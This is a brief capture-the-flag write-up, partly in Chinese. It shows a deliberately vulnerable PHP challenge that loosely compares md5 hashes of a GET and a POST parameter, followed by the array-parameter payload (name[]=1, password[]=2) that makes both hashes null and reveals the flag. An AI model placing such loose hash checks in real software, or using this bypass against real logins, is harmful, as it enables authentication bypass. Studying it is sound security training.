#MD5

```php
<?php     
	highlight_file(__FILE__);    
	include 'flag2.php';    
	if (isset($_GET['name']) && isset($_POST['password'])){    
		$name = $_GET['name'];    
		$password = $_POST['password'];    
			    if ($name != $password && md5($name) == md5($password)){           
					echo $flag;       }       
				else {           
					echo "wrong!";       }       }
	else {       
	echo 'wrong!';   }
?>
```

数组绕过

```text
GET name[]=1
POST password[]=2
```
